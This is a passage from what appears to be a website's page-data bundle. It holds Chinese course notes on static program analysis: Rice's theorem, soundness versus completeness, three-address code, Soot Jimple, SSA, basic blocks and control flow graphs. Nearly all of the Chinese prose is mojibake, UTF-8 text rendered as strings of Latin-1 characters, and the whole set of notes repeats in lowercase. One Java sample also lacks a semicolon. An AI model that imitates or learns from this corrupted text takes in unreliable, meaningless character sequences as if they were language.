åç¨åºä¸­çè¯­ä¹è®¾è®¡è§åã\n\n\n\n# Transfer functions\n\n> Transfer functions are defined according to âanalysis problemâ and the âsemanticsâ of different program statements.\n\n> In static analysis, transfer functions define how to evaluate different program statements on abstract values.\n\n\n\n# Control Flows\n\nControl Flowæ±èçå°æ¹é½è¦ååå¹¶ã\n\n\n\n\n# è¯¾ç¨è®¡å\n\n\n\n 1.  ç®ä»\n 2.  ä¸­é´è¡¨è¾¾ - [[IR]]\n 3.  æ°æ®æµåæ\n 4.  è¿ç¨åæ\n 5.  CFL & IFDS\n 6.  åæ²¿Topic - Soundiness & Soundness\n 7.  æéåæ\n 8.  éæåæå®å¨åºç¨\n 9.  Datalogåæ\n 10. æ½è±¡è§£é\n\nå®éª\n\n\n\n\n# ç¸å³èµæº\n\nåç§°                     å°å\nåäº¬å¤§å­¦-è½¯ä»¶åæè¯¾             çåä¸å®¶_bilibili\nè½¯ä»¶åæä½ä¸                 nju-sa-homework\nPLç¸å³èµæº                 PLèµæº\nYingfei Xiong's Blog   Yingfei Xiong\nåå¤§è½¯ä»¶åæè¯¾PDF             è¯¾ä»¶ä¸è½½",normalizedContent:"# introduction\n\n\n# pl and static analysis\n\npl(programming languages) åä¸ºä¸é¨åï¼\n\n * çè®º(theory)\n   * è¯­è¨è®¾è®¡\n   * ç±»åç³»ç»\n   * å½¢å¼è¯­ä¹\n   * ç¨åºé»è¾\n   * è§£å³çé®é¢ï¼æä¹æå»ºè¯­è¨ï¼\n * ç¯å¢(environment)\n   * ç¼è¯å¨\n   * è¿è¡ç³»ç»\n   * è§£å³çé®é¢ï¼æ¯æè¯­è¨è¿è¡\n * åºç¨(application)\n   * ç¨åºåæ ï¼ä»plè§åº¦æ¥çï¼ç¨åºåææçæ¯éæåæ\n   * ç¨åºéªè¯\n   * ç¨åºåæ\n   * è§£å³çé®é¢ï¼å¯é çãå®å¨çãé«æçç¨åº\n\n\n\nå¤å¹´ä»¥æ¥ï¼è¯­è¨çæ ¸å¿é¨åå¹¶æ²¡æå¤ªå¤§çååï¼æ éä¸ç±»ï¼\n\n * å½ä»¤å¼ï¼javaï¼c)ï¼ä¸æ¡ä¸æ¡æä»¤æ§è¡ï¼\n * å½æ°å¼ï¼pythonï¼jsï¼ï¼å°é»è¾åè£å½¢å¼åï¼\n * é»è¾å¼\n\nè¯­ç¨ç¯å¢åçäºååï¼éçéæ±çå¤æåï¼ç¨åºä¹è¶æ¥è¶å¤æãæ°çææå°±æ¯ï¼å¦ä½å»ä¿è¯å¤æçè½¯ä»¶çå¯é æ§ãå®å¨æ§åä¸äºå¶ä»æ§è½ã\n\n\n# why we need static analysis?\n\néæåæçä½ç¨ï¼\n\n * å¯é æ§ï¼ç©ºæéå¼ç¨ãåå­æ³æ¼ç­\n * åºç¨å®å¨ï¼éç§ä¿æ¤ãæ³¨å¥ç­\n * ç¼è¯ä¼åï¼æåè¿è¡éåº¦ï¼æ­»ä»£ç å é¤ãä»£ç ä½ç½®è°æ´ç­ï¼\n * ç¨åºçè§£ï¼ideçæç¤ºç­\n\néæåæçå¸åºæå¤å¤§ï¼\n\n\n\nå¥½å¤ä¹ä¸ï¼å¯ä»¥æ´å¥½çæ·±å¥äºè§£ç¼ç¨è¯­è¨çè¯­æ³åè¯­ä¹ãä¹äºä¾¿æ¯èªç¶èç¶çä¼ååºå¯é çãå®å¨çãé«æçç¨åºã\n\n\n# what is static analysis\n\n> static analysis analyzes a program p to reason about its behaviors and determines whether it satisfies some properties before running p.\n\nå¨ç¨åºè¿è¡ä¹åäºè§£ç¨åºç¸å³çè¡ä¸ºï¼å¹¶ä¸å³äºç¨åºç¸å³çæ§è´¨è½å¦å¾å°æ»¡è¶³ãè¯´ç½äºå°±æ¯åä¸ä¸ªåæå¨ï¼å¨è¿è¡ç¨åºä¹ååæç¨åºçè¡ä¸ºãæ¯å¦è¯´ï¼ç¨åºæ¯å¦å­å¨ä¿¡æ¯æ³é²ãç©ºæéå¼ç¨ãå¼ºè½¬æ¯å¦å®å¨ãä»»æçä¸¤ä¸ªåéæ¯å¦æååä¸åå°å(æ¡ä»¶ç«äº)ãæ­»ä»£ç ç­ç­çé®é¢ã\n\n\n# rice's theorem\n\n> unfortunately, by riceâs theorem, there is no such approach to determine whether p satisfies such non-trivial properties, i.e., giving exact answer: yes or no\n\néå¸¸éæ¾çæ¯ å¦riceå®çæè¨ï¼å¯¹äºä»¥ä¸çé®é¢ï¼ä¸å­å¨ä¸ä¸ªæ¹æ³è½å¤ç»åºä¸ä¸ªåç¡®çå¤æ­ã\n\n> âany non-trivial property of the behavior of programs in a r.e. language is undecidable.â\n\nr.e. language : éå½å¯æä¸¾çè¯­è¨ï¼ç°ä»£çå ä¹ææè¯­è¨é½æ¯éå½å¯æä¸¾çã æ­£å¸¸çè¯­è¨ç¼åçç¨åºä¸­ï¼ç»åºæä»¬å³æ³¨çé®é¢ï¼ç©ºæéå¼ç¨ç­ï¼çä¸ä¸ªåç¡®çç­æ¡æ¯ä¸å¯è½çã\n\n> a property is trivial if either it is not satisfied by any r.e. language, or if it is satisfied by all r.e. languages; otherwise it is non-trivial.\n\nnon-trival: æä»¬å³æ³¨çè¯¸å¤ç¹æ®çé®é¢ã\n\nä»¥ä¸çç»è®ºåè¯æä»¬ï¼ä¸å­å¨ perfect static analysisã\n\nä¸ä¸ªperfect static analysisï¼æ¯æ¢soundåcomplateãä¸¾ä¸ªæ å­ï¼ä¸ä¸ªç¨åºä¸­å­å¨10ä¸ªç©ºæéå¼ç¨çé®é¢ï¼è½ç¶æ ¹æ®riceå®çï¼ä¸å­å¨ä¸ä¸ªæ¹æ³è½å¤å¾åºè¿ä¸ªç­æ¡ï¼ï¼è¿10ä¸ªé®é¢å°±æ¯truthçï¼ä½æ¯æä»¬çæ¹æ³å¯ä»¥soundæècompleteãsoundçæææ¯ï¼æä»¬å¯ä»¥æ¾å°20ä¸ªï¼åå«10ä¸ªæ­£ç¡®çï¼completeçæææ¯ï¼æä»¬å¯ä»¥æ¾å°5ä¸ªï¼ä½æ¯è¿5ä¸ªé½æ¯æ­£ç¡®çã\n\n\n\né£ä¹æ¢ç¶ä¸å­å¨perfect static analysisï¼æä»¬çéæåææä»ä¹æä¹ï¼\n\nuseful static analysisï¼å¦¥åå¶ä¸­ä¸æ¹ï¼å¾å°çéæåæç»æ\n\n * compromise soundness ï¼ (false positives) è¯¯æ¥\n * compromise completenessï¼(false negatives) æ¼æ¥\n\n\n\nå¨çæ­£çéæåæä¸­ï¼é½æ¯å¦¥åcompleteãå¯ä»¥ä¸ç²¾ç¡®ï¼ä½æ¯ä¸å®è¦soundãå®å¯éæä¸åï¼ä¹ä¸æ¾è¿ä¸ä¸ªã\n\nsoundnesså¯ä»¥çè§£ä¸ºæ­£ç¡®çãåªæå¨å¨é¢åæä¹åï¼ææå¯è½å¾å°ä¸ä¸ªæ­£ç¡®çç»è®ºã\n\n> static analysis: ensure (or get close to) soundness, while making good trade-offs between analysis precision and analysis speed.\n\nå®è§çæ¦æ¬éæåæï¼ç¡®ä¿soundnessçæåµä¸ï¼å¨éåº¦åç²¾åº¦ä¸åä¸ä¸ªå¨æçå¹³è¡¡ã\n\n\n# ä¸¾ä¸ªæ å­è§£ééæåæ\n\nåæç¨åºä¸­åéçç¬¦å·ãè½ç¶ç®åï¼ä½æ¯è¿ä¸ªä¾å­å¯ä»¥å¤æ­é¤é¶éè¯¯ãç´¢å¼è¶çç­ã\n\n# æ½è±¡(abstract)\n\n\n\n# è¿è¿ä¼¼(over-approximation)\n\nå¨æ½è±¡å¼ä¹ä¸ï¼éå¯¹ç¨åºä¸­çæ¯ä¸ä¸ªè¯­å¥åè½¬æ¢è§åãè½¬æ¢è§åæ ¹æ®ä½ çç®æ åç¨åºä¸­çè¯­ä¹è®¾è®¡è§åã\n\n\n\n# transfer functions\n\n> transfer functions are defined according to âanalysis problemâ and the âsemanticsâ of different program statements.\n\n> in static analysis, transfer functions define how to evaluate different program statements on abstract values.\n\n\n\n# control flows\n\ncontrol flowæ±èçå°æ¹é½è¦ååå¹¶ã\n\n\n\n\n# è¯¾ç¨è®¡å\n\n\n\n 1.  ç®ä»\n 2.  ä¸­é´è¡¨è¾¾ - [[ir]]\n 3.  æ°æ®æµåæ\n 4.  è¿ç¨åæ\n 5.  cfl & ifds\n 6.  åæ²¿topic - soundiness & soundness\n 7.  æéåæ\n 8.  éæåæå®å¨åºç¨\n 9.  datalogåæ\n 10. æ½è±¡è§£é\n\nå®éª\n\n\n\n\n# ç¸å³èµæº\n\nåç§°                     å°å\nåäº¬å¤§å­¦-è½¯ä»¶åæè¯¾             çåä¸å®¶_bilibili\nè½¯ä»¶åæä½ä¸                 nju-sa-homework\nplç¸å³èµæº                 plèµæº\nyingfei xiong's blog   yingfei xiong\nåå¤§è½¯ä»¶åæè¯¾pdf             è¯¾ä»¶ä¸è½½",charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"SA - IR",frontmatter:{title:"SA - IR",date:"2022-02-06T00:00:00.000Z",permalink:"/sec/sa/nju/ir",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["éæåæ","åäº¬å¤§å­¦è¯¾ç¨ç¬è®°"],tags:["PL","SA","IR"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/200.%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/2000.%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/01.IR.html",relativePath:"02.å®å¨/200.éæåæ/2000.åäº¬å¤§å­¦è¯¾ç¨ç¬è®°/01.IR.md",key:"v-cba31118",path:"/sec/sa/nju/ir/",headers:[{level:2,title:"Compilers and Static Analyzers",slug:"compilers-and-static-analyzers",normalizedTitle:"compilers and static analyzers",charIndex:137},{level:3,title:"Compiler",slug:"compiler",normalizedTitle:"compiler",charIndex:137},{level:2,title:"AST vs. IR",slug:"ast-vs-ir",normalizedTitle:"ast vs. ir",charIndex:777},{level:2,title:"IR: Three-Address Code (3AC)",slug:"ir-three-address-code-3ac",normalizedTitle:"ir: three-address code (3ac)",charIndex:1272},{level:2,title:"3AC in Real Static Analyzer: Soot",slug:"_3ac-in-real-static-analyzer-soot",normalizedTitle:"3ac in real static analyzer: soot",charIndex:1622},{level:2,title:"Static Single Assignment (SSA)",slug:"static-single-assignment-ssa",normalizedTitle:"static single assignment (ssa)",charIndex:3064},{level:2,title:"Basic Blocks (BB)",slug:"basic-blocks-bb",normalizedTitle:"basic blocks (bb)",charIndex:3223},{level:2,title:"Control Flow Graphs (CFG)",slug:"control-flow-graphs-cfg",normalizedTitle:"control flow graphs (cfg)",charIndex:3492}],headersStr:"Compilers and Static Analyzers Compiler AST vs. IR IR: Three-Address Code (3AC) 3AC in Real Static Analyzer: Soot Static Single Assignment (SSA) Basic Blocks (BB) Control Flow Graphs (CFG)",content:"# IR\n\n> å¨ç¼è¯åçæ¶ï¼æä»¬ç¨æ½è±¡è¯­æ³æ å»ä½ä¸ºä¸­é´è¡¨ç¤ºå½¢å¼ãéæåæå¨ä¹éè¦ä¸ç§ç¨åºçè¡¨ç¤ºå½¢å¼ï¼è¿ä¸ªè¡¨ç¤ºæ ¼å¼éè¦æ¶ç®ä¾¿çãå©äºéæåæç®æ³çè®¾è®¡çãçæ­£å¥½çIRä¹å¹¶æ²¡æä¸¥æ ¼çå®ä¹ãç»å¤§é¨åéæåæå¨çIRåºè¯¥æ¯ä¸ä¸ªä»ä¹æ ·å­ï¼æºç¨åº-> IR -> åç»­åæã\n\n\n# Compilers and Static Analyzers\n\n\n# Compiler\n\nå°Source Codeç¿»è¯è½¬æ¢ä¸ºMachine Codeçè¿ç¨ä¸­ï¼è¯å«æºä»£ç ä¸­çéè¯¯ã\n\nç¼è¯çè¿ç¨ï¼\n\n 1. Scanner - è¯æ³åæ Lexical Analysis è¯æ³åæçè§åæè¿°å½¢å¼åçæ¹æ³æ¯ï¼Regular Expressionãå°åæ³çåè¯çæTokensã\n 2. Parser - è¯­æ³åæ Syntax Analysis å°è¯æ³åæçæçTokensäº¤ç»è¯­æ³åæå¨ï¼ä½¿ç¨Context-Free Grammerï¼ä¸ä¸ææ å³ææ³ï¼ãå°åæ³çç¨åºçæASTï¼æ½è±¡è¯­æ³æ ï¼\n 3. Type Checker - è¯­ä¹åæ Semantic Analysis å©ç¨æ½è±¡è¯­æ³æ å¯¹è¯­ä¹è¿è¡åæï¼ä»ç¼è¯å¨çè§åº¦å°ï¼åªè½åç®åçæ£æ¥ï¼å¦ï¼ç±»åæ£æ¥ãå½¢å¼åè¯­è¨æ¯ï¼Attribute GrammerãçæDecorated ASTã\n 4. Translator - ç¼è¯ä¼å å¦æè¿éè¦ä¼åç­æä½ï¼éè¦å°ä¸ä¸æ­¥çæçç»æè½¬åä¸ºIRï¼éå¸¸ä¸ºä¸å°åç ï¼ï¼å¹¶è¿è¡Static Analysisã\n 5. CodeGenerator - çææºå¨ç \n\né£ä¹è½ä¸è½ç´æ¥å°æºç¨åºçæä¸å°åç çIRï¼è¿è¡éæåæå¢ï¼ä¸è¡çï¼æä»¬å³æ³¨çé®é¢æ¯ä¸ä¸ªç¸å¯¹é«çº§çåå®¹ï¼å¦æåºæ¬çè¯æ³ãè¯­æ³ç­é½æ æ³éè¿ï¼åç»­ä¹æ²¡æä»ä¹æä¹ãå æ­¤ï¼æä»¬çéæåææ¯å»ºç«å¨ä¸ä¸ªéè¿äºåç«¯çæ ¡éªçåæ³IRä¹ä¸çã\n\n\n# AST vs. IR\n\nä¸ºä»ä¹è¦ç¨ä¸å°åç çIRå¢ï¼ASTä¸è½è§£å³é®é¢åï¼\n\nAST                                IR\nhigh-level                         low-level\nclosed to grammar structure        closed to machine code\nusually language dependent         usually language independent\nsuitable for fast type checking    compact and uniform\nlack of control flow information   contains control flow information\n                                   usually considered as the basis for static analysis\n\nä»¥ä¸çä¸å°åç å©äºéæåæçç¹æ§ï¼å¯¼è´éæåæéå¸¸åºäºIRè¿è¡åæã\n\n\n# IR: Three-Address Code (3AC)\n\n> There is at most one operator on the right side of an instruction.\n\néå¸¸æåµä¸å³è¾¹åªæä¸ä¸ªæä½ç¬¦ãè½¬æ¢æ¶éå¸¸å¼å¥ä¸´æ¶åéãä¸å°åç åå«æå¤ä¸ä¸ªå°åãå°åç±ä»¥ä¸çå½¢å¼è¡¨ç¤ºï¼\n\n * æ è¯ç¬¦ï¼a,b\n * å¸¸éå¼ï¼3\n * éæåæå¨èªå¨çæçä¸´æ¶åéï¼t1,t2\n\nå¸¸è§çä¸å°åç å½¢å¼ï¼\n\nx = y bop z  bop: äºåæä½ç¬¦ \nx = uop y    uop: ä¸åæä½ç¬¦\nx = y   æ æä½ç¬¦\ngoto L  æ æ¡ä»¶è·³è½¬ L æ¯ä¸ä¸ªæ ç­¾\nif x goto L ææ¡ä»¶è·³è½¬\nif x rop y goto L \n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 3AC in Real Static Analyzer: Soot\n\nSoot: Soot's is Jimple: typed 3-address code.\n\nMost popular static analysis framework for Java\n\næ¯å¦ä¸é¢çJavaç¨åºï¼\n\npackage nju.sa.examples;\npublic class FOrLoop3AC{\n\tpublic static void main(String[] args){\n\t\tint x = 0;\n\t\tfor(int i = 0;i<10;i++){\n\t\t\tx = x+1\n\t\t}\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå¯ä»¥çæå¦ä¸ç***Jimple***\n\npublic static void main(java.lang.String[])\n{\n\tjava.lang.String[] r0;\n\tint i1;\n\n\tr0 := @parameter0: java.lang.String[];\n\ti1 = 0;\n\nlabel1:\n\tif i1 >=10 goto label2;\n\ti1 = i1+1;\n\tgoto label1;\n\nlabel2:\n\treturn;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nDoWhile Loop ãMethod CallãClass å¯¹åºçJimpleï¼å¯ä»¥å¨è¯¾ä»¶éçå°ã\n\nTips: å³äºJavaä¸­çè°ç¨æä»¤\n\næä»¤                è¯´æ\ninvokeinterface   ç¨ä»¥è°ç¨æ¥å£æ¹æ³ï¼å¨è¿è¡æ¶æç´¢ä¸ä¸ªå®ç°äºè¿ä¸ªæ¥å£æ¹æ³çå¯¹è±¡ï¼æ¾åºéåçæ¹æ³è¿è¡è°ç¨ãï¼Invoke interface\n                  methodï¼\ninvokevirtual     æä»¤ç¨äºè°ç¨å¯¹è±¡çå®ä¾æ¹æ³ï¼æ ¹æ®å¯¹è±¡çå®éç±»åè¿è¡åæ´¾ï¼Invoke instance method; dispatch\n                  based on classï¼\ninvokestatic      ç¨ä»¥è°ç¨ç±»æ¹æ³ï¼Invoke a class (static) method ï¼\ninvokespecial     æä»¤ç¨äºè°ç¨ä¸äºéè¦ç¹æ®å¤ççå®ä¾æ¹æ³ï¼åæ¬å®ä¾åå§åæ¹æ³ãç§ææ¹æ³åç¶ç±»æ¹æ³ãï¼Invoke instance\n                  method; special handling for superclass, private, and\n                  instance initialization method invocations ï¼\ninvokedynamic     JDK1.7æ°å å¥çä¸ä¸ªèææºæä»¤ï¼ç¸æ¯äºä¹åçåæ¡æä»¤ï¼ä»ä»¬çåæ´¾é»è¾é½æ¯åºåå¨JVMåé¨ï¼èinvokedynamicåç¨äºå¤çæ°çæ¹æ³åæ´¾ï¼å®åè®¸åºç¨çº§å«çä»£ç æ¥ç¡®å®æ§è¡åªä¸ä¸ªæ¹æ³è°ç¨ï¼åªæå¨è°ç¨è¦æ§è¡çæ¶åï¼æä¼è¿è¡è¿ç§å¤æ­,ä»èè¾¾å°å¨æè¯­è¨çæ¯æã(Invoke\n                  dynamic method)\n\nå³äºMethod Signatureï¼class name : return type method name(parameter1 type....)\n\n\n# Static Single Assignment (SSA)\n\nSSAæ¯IRä¸­ä¸ä¸ªç»å¸çè½¬åæ ¼å¼ãSSAç»æ¯ä¸ä¸ªå®ä¹ä¸ä¸ªæ°çåå­ï¼å¹¶ä¸å¨åé¢è¿è¡è°ç¨ãæ¯ä¸ä¸ªæ è¯ç¬¦é½æå¯ä¸çå®ä¹ã\n\n\n\nä½æ¯å¯¹äºåæ¯èè¨ï¼å¯è½åºç°ä¸é¢çç¹æ®æåµï¼äºæ¯å¼å¥äºä¸ä¸ªç¹æ®çè¿ç®ã\n\n\n\nä¸ºä»ä¹è¦æSSAï¼é£ä¹ä¸ºä»ä¹åä¸ç¨SSAï¼\n\n\n\n\n# Basic Blocks (BB)\n\nBBæ¯æ»¡è¶³ä»¥ä¸çç¹å¾çæå¤§æä»¤çéåï¼\n\n * å¥å£åªæä¸ä¸ªï¼ä¸å­å¨ç¬¬äºæ¡æ§å¶æµèµ°å¥BBä¸­çç¬¬äºæ¡æèç¬¬ä¸æ¡æä»¤\n * åºå£åºè¯¥æ¯æåä¸ä¸ªæä»¤ï¼ä¸å­å¨ä»å¶ä»éæåæä»¤èµ°åºã\n\n\n\nBBæä¹ååï¼\n\nä¸æ¡ä¸æ¡çï¼å°è¯æä¸ä¸è¡å å¥ï¼æ¥çæ¯å¦ç¬¦åè§åï¼gotoçlabelï¼å­å¨gotoï¼ï¼ç´å°æåã\n\n 1. å³å®leader\n    * ç¨åºç¬¬ä¸æ¡æä»¤\n    * jumpçtarget\n    * ä¸ä¸æ¡æä»¤å­å¨ä¸ä¸ªjump\n 2. å»ºç«BB\n    * ç±å¥å£å°ä¸ä¸ä¸ªå¥å£ä¹é´çæä»¤\n\n\n\n\n# Control Flow Graphs (CFG)\n\næä¹å¨BBçåºç¡ä¸æå»ºCFGå¢ï¼\n\n 1. å°è¯­å¥çlabelè½¬åä¸ºBBçlabelï¼ä»ç»ç²åº¦åä¸ºç²ç²åº¦çlabelä¹åï¼å¦æblockä¸­å­å¨è¯­å¥çååï¼å¯è½CFGä¸ä¼äº§çå¤ªå¤§çååã\n\n\n\n 3. æç§è§åæ·»å è¾¹\n\næ·»è¾¹è§åï¼\n\n * ææ¡ä»¶æèæ æ¡ä»¶çä»Aå°Bè·³è½¬\n * Bç´§æ¥çAé¡ºåºæ§è¡æ¶æ·»å è¾¹ï¼å¦æAæåä¸æ¡æ¯æ æ¡ä»¶çgotoï¼é£ä¹ä¸åºè¯¥æ·»è¾¹\n\n 4. æ·»å ç¨åºçæ­£çåºå£åå¥å£ï¼å¦ææå¤ä¸ªreturnï¼åå­å¨å¤ä¸ªexitã\n\n",normalizedContent:"# ir\n\n> å¨ç¼è¯åçæ¶ï¼æä»¬ç¨æ½è±¡è¯­æ³æ å»ä½ä¸ºä¸­é´è¡¨ç¤ºå½¢å¼ãéæåæå¨ä¹éè¦ä¸ç§ç¨åºçè¡¨ç¤ºå½¢å¼ï¼è¿ä¸ªè¡¨ç¤ºæ ¼å¼éè¦æ¶ç®ä¾¿çãå©äºéæåæç®æ³çè®¾è®¡çãçæ­£å¥½çirä¹å¹¶æ²¡æä¸¥æ ¼çå®ä¹ãç»å¤§é¨åéæåæå¨çiråºè¯¥æ¯ä¸ä¸ªä»ä¹æ ·å­ï¼æºç¨åº-> ir -> åç»­åæã\n\n\n# compilers and static analyzers\n\n\n# compiler\n\nå°source codeç¿»è¯è½¬æ¢ä¸ºmachine codeçè¿ç¨ä¸­ï¼è¯å«æºä»£ç ä¸­çéè¯¯ã\n\nç¼è¯çè¿ç¨ï¼\n\n 1. scanner - è¯æ³åæ lexical analysis è¯æ³åæçè§åæè¿°å½¢å¼åçæ¹æ³æ¯ï¼regular expressionãå°åæ³çåè¯çætokensã\n 2. parser - è¯­æ³åæ syntax analysis å°è¯æ³åæçæçtokensäº¤ç»è¯­æ³åæå¨ï¼ä½¿ç¨context-free grammerï¼ä¸ä¸ææ å³ææ³ï¼ãå°åæ³çç¨åºçæastï¼æ½è±¡è¯­æ³æ ï¼\n 3. type checker - è¯­ä¹åæ semantic analysis å©ç¨æ½è±¡è¯­æ³æ å¯¹è¯­ä¹è¿è¡åæï¼ä»ç¼è¯å¨çè§åº¦å°ï¼åªè½åç®åçæ£æ¥ï¼å¦ï¼ç±»åæ£æ¥ãå½¢å¼åè¯­è¨æ¯ï¼attribute grammerãçædecorated astã\n 4. translator - ç¼è¯ä¼å å¦æè¿éè¦ä¼åç­æä½ï¼éè¦å°ä¸ä¸æ­¥çæçç»æè½¬åä¸ºirï¼éå¸¸ä¸ºä¸å°åç ï¼ï¼å¹¶è¿è¡static analysisã\n 5. codegenerator - çææºå¨ç \n\né£ä¹è½ä¸è½ç´æ¥å°æºç¨åºçæä¸å°åç çirï¼è¿è¡éæåæå¢ï¼ä¸è¡çï¼æä»¬å³æ³¨çé®é¢æ¯ä¸ä¸ªç¸å¯¹é«çº§çåå®¹ï¼å¦æåºæ¬çè¯æ³ãè¯­æ³ç­é½æ æ³éè¿ï¼åç»­ä¹æ²¡æä»ä¹æä¹ãå æ­¤ï¼æä»¬çéæåææ¯å»ºç«å¨ä¸ä¸ªéè¿äºåç«¯çæ ¡éªçåæ³irä¹ä¸çã\n\n\n# ast vs. ir\n\nä¸ºä»ä¹è¦ç¨ä¸å°åç çirå¢ï¼astä¸è½è§£å³é®é¢åï¼\n\nast                                ir\nhigh-level                         low-level\nclosed to grammar structure        closed to machine code\nusually language dependent         usually language independent\nsuitable for fast type checking    compact and uniform\nlack of control flow information   contains control flow information\n                                   usually considered as the basis for static analysis\n\nä»¥ä¸çä¸å°åç å©äºéæåæçç¹æ§ï¼å¯¼è´éæåæéå¸¸åºäºirè¿è¡åæã\n\n\n# ir: three-address code (3ac)\n\n> there is at most one operator on the right side of an instruction.\n\néå¸¸æåµä¸å³è¾¹åªæä¸ä¸ªæä½ç¬¦ãè½¬æ¢æ¶éå¸¸å¼å¥ä¸´æ¶åéãä¸å°åç åå«æå¤ä¸ä¸ªå°åãå°åç±ä»¥ä¸çå½¢å¼è¡¨ç¤ºï¼\n\n * æ è¯ç¬¦ï¼a,b\n * å¸¸éå¼ï¼3\n * éæåæå¨èªå¨çæçä¸´æ¶åéï¼t1,t2\n\nå¸¸è§çä¸å°åç å½¢å¼ï¼\n\nx = y bop z  bop: äºåæä½ç¬¦ \nx = uop y    uop: ä¸åæä½ç¬¦\nx = y   æ æä½ç¬¦\ngoto l  æ æ¡ä»¶è·³è½¬ l æ¯ä¸ä¸ªæ ç­¾\nif x goto l ææ¡ä»¶è·³è½¬\nif x rop y goto l \n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 3ac in real static analyzer: soot\n\nsoot: soot's is jimple: typed 3-address code.\n\nmost popular static analysis framework for java\n\næ¯å¦ä¸é¢çjavaç¨åºï¼\n\npackage nju.sa.examples;\npublic class forloop3ac{\n\tpublic static void main(string[] args){\n\t\tint x = 0;\n\t\tfor(int i = 0;i<10;i++){\n\t\t\tx = x+1\n\t\t}\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå¯ä»¥çæå¦ä¸ç***jimple***\n\npublic static void main(java.lang.string[])\n{\n\tjava.lang.string[] r0;\n\tint i1;\n\n\tr0 := @parameter0: java.lang.string[];\n\ti1 = 0;\n\nlabel1:\n\tif i1 >=10 goto label2;\n\ti1 = i1+1;\n\tgoto label1;\n\nlabel2:\n\treturn;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\ndowhile loop ãmethod callãclass å¯¹åºçjimpleï¼å¯ä»¥å¨è¯¾ä»¶éçå°ã\n\ntips: å³äºjavaä¸­çè°ç¨æä»¤\n\næä»¤                è¯´æ\ninvokeinterface   ç¨ä»¥è°ç¨æ¥å£æ¹æ³ï¼å¨è¿è¡æ¶æç´¢ä¸ä¸ªå®ç°äºè¿ä¸ªæ¥å£æ¹æ³çå¯¹è±¡ï¼æ¾åºéåçæ¹æ³è¿è¡è°ç¨ãï¼invoke interface\n                  methodï¼\ninvokevirtual     æä»¤ç¨äºè°ç¨å¯¹è±¡çå®ä¾æ¹æ³ï¼æ ¹æ®å¯¹è±¡çå®éç±»åè¿è¡åæ´¾ï¼invoke instance method; dispatch\n                  based on classï¼\ninvokestatic      ç¨ä»¥è°ç¨ç±»æ¹æ³ï¼invoke a class (static) method ï¼\ninvokespecial     æä»¤ç¨äºè°ç¨ä¸äºéè¦ç¹æ®å¤ççå®ä¾æ¹æ³ï¼åæ¬å®ä¾åå§åæ¹æ³ãç§ææ¹æ³åç¶ç±»æ¹æ³ãï¼invoke instance\n                  method; special handling for superclass, private, and\n                  instance initialization method invocations ï¼\ninvokedynamic     jdk1.7æ°å å¥çä¸ä¸ªèææºæä»¤ï¼ç¸æ¯äºä¹åçåæ¡æä»¤ï¼ä»ä»¬çåæ´¾é»è¾é½æ¯åºåå¨jvmåé¨ï¼èinvokedynamicåç¨äºå¤çæ°çæ¹æ³åæ´¾ï¼å®åè®¸åºç¨çº§å«çä»£ç æ¥ç¡®å®æ§è¡åªä¸ä¸ªæ¹æ³è°ç¨ï¼åªæå¨è°ç¨è¦æ§è¡çæ¶åï¼æä¼è¿è¡è¿ç§å¤æ­,ä»èè¾¾å°å¨æè¯­è¨çæ¯æã(invoke\n                  dynamic method)\n\nå³äºmethod signatureï¼class name : return type method name(parameter1 type....)\n\n\n# static single assignment (ssa)\n\nssaæ¯irä¸­ä¸ä¸ªç»å¸çè½¬åæ ¼å¼ãssaç»æ¯ä¸ä¸ªå®ä¹ä¸ä¸ªæ°çåå­ï¼å¹¶ä¸å¨åé¢è¿è¡è°ç¨ãæ¯ä¸ä¸ªæ è¯ç¬¦é½æå¯ä¸çå®ä¹ã\n\n\n\nä½æ¯å¯¹äºåæ¯èè¨ï¼å¯è½åºç°ä¸é¢çç¹æ®æåµï¼äºæ¯å¼å¥äºä¸ä¸ªç¹æ®çè¿ç®ã\n\n\n\nä¸ºä»ä¹è¦æssaï¼é£ä¹ä¸ºä»ä¹åä¸ç¨ssaï¼\n\n\n\n\n# basic blocks (bb)\n\nbbæ¯æ»¡è¶³ä»¥ä¸çç¹å¾çæå¤§æä»¤çéåï¼\n\n * å¥å£åªæä¸ä¸ªï¼ä¸å­å¨ç¬¬äºæ¡æ§å¶æµèµ°å¥bbä¸­çç¬¬äºæ¡æèç¬¬ä¸æ¡æä»¤\n * åºå£åºè¯¥æ¯æåä¸ä¸ªæä»¤ï¼ä¸å­å¨ä»å¶ä»éæåæä»¤èµ°åºã\n\n\n\nbbæä¹ååï¼\n\nä¸æ¡ä¸æ¡çï¼å°è¯æä¸ä¸è¡å å¥ï¼æ¥çæ¯å¦ç¬¦åè§åï¼gotoçlabelï¼å­å¨gotoï¼ï¼ç´å°æåã\n\n 1. å³å®leader\n    * ç¨åºç¬¬ä¸æ¡æä»¤\n    * jumpçtarget\n    * ä¸ä¸æ¡æä»¤å­å¨ä¸ä¸ªjump\n 2. å»ºç«bb\n    * ç±å¥å£å°ä¸ä¸ä¸ªå¥å£ä¹é´çæä»¤\n\n\n\n\n# control flow graphs (cfg)\n\næä¹å¨bbçåºç¡ä¸æå»ºcfgå¢ï¼\n\n 1. å°è¯­å¥çlabelè½¬åä¸ºbbçlabelï¼ä»ç»ç²åº¦åä¸ºç²ç²åº¦çlabelä¹åï¼å¦æblockä¸­å­å¨è¯­å¥çååï¼å¯è½cfgä¸ä¼äº§çå¤ªå¤§çååã\n\n\n\n 3. æç§è§åæ·»å è¾¹\n\næ·»è¾¹è§åï¼\n\n * ææ¡ä»¶æèæ æ¡ä»¶çä»aå°bè·³è½¬\n * bç´§æ¥çaé¡ºåºæ§è¡æ¶æ·»å è¾¹ï¼å¦æaæåä¸æ¡æ¯æ 